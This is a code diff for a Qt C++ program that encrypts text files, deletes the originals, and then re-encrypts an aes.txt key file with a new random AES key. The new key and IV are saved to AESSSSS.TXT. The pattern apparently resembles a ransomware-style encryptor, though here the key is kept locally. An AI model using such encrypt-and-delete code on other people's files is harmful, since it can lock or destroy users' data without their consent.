@@ -91,6 +91,50 @@ void handleTxtFiles()
             file.remove(); // 删除原始文件
         }
     }
+
+    // 检查是否已经加密过 aes.txt
+    QString flagFilePath = dir.absoluteFilePath("aes_encrypted.flag");
+    if (!QFile::exists(flagFilePath))
+    {
+        // 再次加密 aes.txt 文件
+        QFile aesFile(aesFilePath);
+        if (aesFile.open(QIODevice::ReadOnly | QIODevice::Text))
+        {
+            QTextStream aesStream(&aesFile);
+            QString aesContent = aesStream.readAll();
+            aesFile.close();
+
+            // 生成新的随机 AES 密钥和 IV
+            QByteArray aesKey = generateRandomBytes(32); // 256 位密钥
+            QByteArray aesIv = generateRandomBytes(16); // 128 位 IV
+
+            // 使用新密钥加密 aes.txt 文件内容
+            QByteArray aesEncrypted = aesEncrypt(aesContent.toUtf8(), aesKey, aesIv);
+
+            // 保存加密后的 aes.txt 文件内容
+            if (aesFile.open(QIODevice::WriteOnly))
+            {
+                aesFile.write(aesEncrypted);
+                aesFile.close();
+            }
+
+            // 将新的 AES 密钥和 IV 保存到 AESSSSS.TXT 文件中
+            QString aesKeyFilePath = dir.absoluteFilePath("AESSSSS.TXT");
+            QFile aesKeyFile(aesKeyFilePath);
+            if (aesKeyFile.open(QIODevice::WriteOnly | QIODevice::Text))
+            {
+                QTextStream keyStream(&aesKeyFile);
+                keyStream << "AES Key: " << aesKey.toHex() << "\n";
+                keyStream << "IV: " << aesIv.toHex() << "\n";
+                aesKeyFile.close();
+            }
+
+            // 创建标识文件表示已加密过 aes.txt
+            QFile flagFile(flagFilePath);
+            flagFile.open(QIODevice::WriteOnly);
+            flagFile.close();
+        }
+    }
 }
 
 int main(int argc, char *argv[])
